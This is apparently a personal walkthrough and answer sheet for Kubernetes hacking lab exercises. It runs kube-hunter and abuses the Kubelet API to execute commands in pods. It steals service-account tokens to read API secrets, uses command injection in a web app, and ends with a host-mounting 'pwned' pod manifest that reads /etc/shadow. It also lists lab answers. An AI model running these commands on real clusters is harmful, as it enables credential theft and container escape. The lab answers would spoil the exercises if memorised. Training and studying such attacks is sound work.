@@ -1,0 +1,201 @@
+Hacking Kubernetes
+
+To see cluster vulnerabilities from the perspective of an external attacker, where would you deploy kube-hunter?
+
+	****On a Remote Machine****
+
+How should you deploy kube-hunter if you want to use the reporting plugin?
+
+	****As a Docker Container****
+
+Use kubectl and the job.yaml file in your home directory to create the kube-hunter job.
+Describe the job to find the name of the pod.
+View the logs of the pod and answer the first set of questions.
+		~cat job.yaml
+			~kubectl apply -f job.yaml
+			~kubectl get jobs
+			~kubectl describe job kube-hunter
+			~kubectl logs kube-hunter-b4lfk
+Use kube-hunter to passively scan the cluster. On which port can a writable Kubelet API be accessed?
+
+	****10250****(Look through logs for NOT readonly)
+
+Reviewing the logs, what type of token does kube-hunter use to access the main API?
+
+	****service account token****(Read through logs)
+
+From the kube-hunter results, what 'disclosure' is available on port 10255?
+
+	****Cluster Health****
+
+Delete the kube-hunter job.
+		~kubectl delete job kube-hunter
+Edit the job.yaml file, changing the arguments so the --active flag is also passed to kube-hunter.
+		~vim job.yaml 
+		~args: ["--pod", "--active"] ~Esc, :wq, enter,
+		~Kubectl describe jobs kube-hunter
+		~kubectl logs -f kube-hunter-6t77j (This will take a few minutes to run)
+Use kubectl and the job.yaml file in your home directory to recreate the kube-hunter job.
+Describe the job to find the name of the pod.
+View the logs of the pod and answer the next questions. 
+
+After deploying kube-hunter in active mode and waiting for the scan to complete, what kind of pod does it create?
+
+	****PRIVILEGED****(Will be displayed after running kubectl logs -f kube-hunter-xxxxx
+
+What type of resource is kube-hunter unable to delete in this cluster?
+
+	****Role****(Search through logs to find 'unable to delete')
+
+==============================================
+Kubernetes – Attacking The Kubelet API: Ep.1
+
+Use cURL or wget to retrieve information about the Kubernetes cluster using the Kubelet API.
+		~export node=10.102.135.7
+		~curl -k https://10.102.135.7:10250/pods | jq | grep nodeName(-k negates the SSL Certificate/ jq outputs the JSON in a more readable format)
+What is the nodeName of the master node?
+
+	****core-apps****
+
+What Kubernetes distribution is running on the node?
+		~curl -k https://10.102.135.7:10250/configz | jq
+	****microk8s****(Search through nested JSON)
+
+Using the metrics page, what version of Go is the node using?
+		~curl -k https://10.102.135.7:10250/metrics | grep -i version
+	****go1.15.10****
+
+One of the pods is an Nginx deployment. What namespace does it use?
+		~curl -k https://10.102.135.7:10250/pods | jq | less
+	****default****
+
+What is the value in the SECRET_VALUE environment variable in the Nginx pod?
+		~curl -k https://10.102.135.7:10250/pods | jq | less, then press / SECRET, this will search the config file
+	****1abeb5****
+
+==========================================
+Kubernetes – Attacking the Kubelet API: Ep.2
+
+Use cURL, wget or a web browser to retrieve information about the Kubernetes cluster using the Kubelet API.
+Run arbitrary commands on the Nginx pod to get the question token and service account token.
+With the service account token, compromise the Kubernetes API server and grab the secrets to answer the questions.
+		~export NODE=10.102.139.215
+		~curl -k https://10.102.139.215:10250/runningpods/
+		~curl -k https://10.102.139.215:10250/runningpods/| jq | less , / nginx
+		~export POD="nginx-deployment-548bbc49bd-rj92r"
+		~curl -k -XPOST "https://10.102.139.215:10250/run/default/nginx-deployment-548bbc49bd-rj92r/nginx" -d "cmd=ls -la /"
+		~curl -k -XPOST "https://10.102.139.215:10250/run/default/nginx-deployment-548bbc49bd-rj92r/nginx" -d "cmd=cat /tmp/token.txt"
+There is a file named token.txt inside the /tmp folder on the Nginx pod. What is the value inside the file?
+
+	****220b12****(Follow steps above)
+
+Using the Service Account token, what is the password contained in the very-secret-corp-credentials secret on the Kubernetes API server?
+		~curl -kL -XPOST "https://10.102.139.215:10250/run/default/nginx-deployment-548bbc49bd-rj92r/nginx" -d "cmd=cat /run/secrets/kubernetes.io/serviceaccount/token"
+		~export token=xxxxxxxxxxxxxlong string this then becomes $TOKEN in your command
+		~curl -ks -H "Authorization: Bearer $TOKEN" https://10.102.139.215:16443/api/v1/namespaces/default/secrets
+		~echo -n "NjkxNjc3" | base64 -d
+	****691677****	
+
+=====================================
+Kubernetes - Vulnerable Web Application
+
+Go to Mike's website at http://classrowlibrary.com.
+Discover the remote code execution (RCE) vulnerability.
+Gain access to a node from the pod.
+Gain access to a node from the pod.
+
+What Linux distribution is the web server running on?
+		~127.0.0.1; cat /etc/os-release
+	****Alpine Linux****
+
+What is the process id (PID) of the web application server?
+		~127.0.0.1; ps aux
+	****6****(6 root      0:00 ./workspaceavailability)
+
+Three users on the node have hashed passwords. Name one of them.
+		~127.0.0.1; ls -lR
+		~echo 'test' > public/images/test.txt(This will allow us to see if there are write permissions on the container)
+		Open a new tab, C&P http://classrowlibrary.com/images/test.txt	You should then see the 'test' output
+		~vim manifest.yaml
+
+What is the name of the deployment?
+		~curl -ks -H "Authorization: Bearer $(cat /run/secrets/kubernetes.io/serviceaccount/token)" https://kubernetes.default/apis/apps/v1/namespaces/default/deployments?limit=100
+	****library-deployment****
+
+What is the secret token?
+		~127.0.0.1; env(This will show you the environmental variables of the pod)
+		~127.0.0.1; which curl
+		~/usr/bin/curl
+		KUBERNETES_PORT=tcp://10.152.183.1:443
+		~127.0.0.1; curl -ks -H "Authorization: Bearer $(cat /run/secrets/kubernetes.io/serviceaccount/token)" https://kubernetes.default/api/v1/namespaces/default/secrets
+		~echo -n "OThkNzA0" | base64 -d
+	****98d704****
+
+========================================
+Kubernetes - Not So Secret
+
+Use cURL to connect to the Kubernetes API and list the secrets.
+Find the content of the immersivelabs secret and Base64 decode it.
+
+What is the full path to the automounted service token within a pod?
+		
+	****/run/secrets/kubernetes.io/serviceaccount/token****(Same method as previous module)
+
+Retrieve the ‘immersivelabs’ secret. What is the decoded token?
+		~curl -ks -H "Authorization: Bearer $(cat /run/secrets/kubernetes.io/serviceaccount/token)" https://kubernetes.default/api/v1/namespaces/default/secrets?limit=100
+		~echo -n "MDI3YTJhCg==" | base64 -d
+	****61a798****
+
+
+
+curl -ks -H "Authorization: Bearer $(cat /run/secrets/kubernetes.io/serviceaccount/token)" https://kubernetes.default/apis/apps/v1/namespaces/default/deployments?limit=100
+curl -ks -H "Authorization: Bearer $(cat /run/secrets/kubernetes.io/serviceaccount/token)" https://kubernetes.default/apis/apps/v1/namespaces/default/secrets
+
+
+apiVersion: v1
+kind: Pod
+Metadata:
+	name: pwned
+spec:
+	containers:
+		- name: pwned
+		 image: docker.io/immersivelabs/workspaceavailability:latest
+		imagePullPolicy: IfNotPresent
+		command: ["bin/bash"]
+		args: ["-c", "cat /host/etc/shadow && sleep 3600"]
+		volumeMounts:
+		- name: host
+		mountPath: /host
+volumes:
+		- name: host
+		hostPath:
+		path: /
+		type: Directory
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
